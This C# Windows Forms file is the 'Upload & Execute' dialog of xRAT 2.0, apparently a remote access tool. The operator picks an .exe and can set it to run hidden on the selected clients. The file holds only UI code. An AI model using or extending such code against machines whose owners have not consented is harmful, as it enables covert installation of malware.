using System;
using System.IO;
using System.Windows.Forms;

namespace xServer.Forms
{
    public partial class FrmUploadAndExecute : Form
    {
        private readonly int _selectedClients;

        public FrmUploadAndExecute(int selected)
        {
            _selectedClients = selected;
            InitializeComponent();
        }

        private void FrmUploadAndExecute_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Upload & Execute [Selected: {0}]", _selectedClients);
            chkRunHidden.Checked = Core.Misc.UploadAndExecute.RunHidden;
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable (*.exe)|*.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = ofd.FileName;
                }
            }
        }

        private void btnUploadAndExecute_Click(object sender, EventArgs e)
        {
            Core.Misc.UploadAndExecute.FilePath = File.Exists(txtPath.Text) ? txtPath.Text : string.Empty;
            Core.Misc.UploadAndExecute.RunHidden = chkRunHidden.Checked;

            this.DialogResult = DialogResult.OK;
            this.Close();
        }
    }
}